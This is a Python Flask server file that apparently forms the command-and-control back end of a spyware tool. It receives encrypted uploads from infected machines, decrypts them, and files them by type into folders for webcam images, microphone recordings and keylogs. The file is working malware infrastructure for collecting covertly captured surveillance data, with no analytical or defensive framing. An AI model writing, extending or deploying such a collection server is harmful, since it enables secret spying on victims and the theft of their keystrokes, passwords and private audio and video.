from flask import Flask, request
import os
import uuid
from decryptor import decrypt_file

app = Flask(__name__)

# Get the absolute path to the server/ directory
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# Define directories relative to server/
RECEIVED_DIR = os.path.join(BASE_DIR, "received")
STATIC_CAM_DIR = os.path.join(BASE_DIR, "static", "cam")
STATIC_MIC_DIR = os.path.join(BASE_DIR, "static", "mic")
STATIC_KEYS_DIR = os.path.join(BASE_DIR, "static", "keylogs")

# Ensure all folders exist
os.makedirs(RECEIVED_DIR, exist_ok=True)
os.makedirs(STATIC_CAM_DIR, exist_ok=True)
os.makedirs(STATIC_MIC_DIR, exist_ok=True)
os.makedirs(STATIC_KEYS_DIR, exist_ok=True)

@app.route("/upload", methods=["POST"])
def upload():
    uploaded_file = request.files.get("file")
    if not uploaded_file:
        return "No file uploaded", 400

    # Save the encrypted file temporarily
    enc_filename = f"{uuid.uuid4().hex}.enc"
    enc_path = os.path.join(RECEIVED_DIR, enc_filename)
    uploaded_file.save(enc_path)

    # Create a temporary path for decrypted content
    temp_path = os.path.join(RECEIVED_DIR, f"tmp_{uuid.uuid4().hex}")
    
    try:
        # First decrypt to temp to inspect file header
        decrypt_file(enc_path, temp_path)

        with open(temp_path, "rb") as f:
            signature = f.read(4)

        # Determine file type by signature
        if signature.startswith(b"\xff\xd8\xff"):
            final_path = os.path.join(STATIC_CAM_DIR, f"{uuid.uuid4().hex}.jpg")
        elif signature.startswith(b"RIFF"):
            final_path = os.path.join(STATIC_MIC_DIR, f"{uuid.uuid4().hex}.wav")
        else:
            final_path = os.path.join(STATIC_KEYS_DIR, f"{uuid.uuid4().hex}.txt")

        # Re-decrypt to final path
        decrypt_file(enc_path, final_path)

        os.remove(temp_path)  # remove temporary file
        return f"File decrypted and saved to {final_path}", 200

    except Exception as e:
        return f"Decryption failed: {e}", 500

if __name__ == "__main__":
    app.run(port=5000)
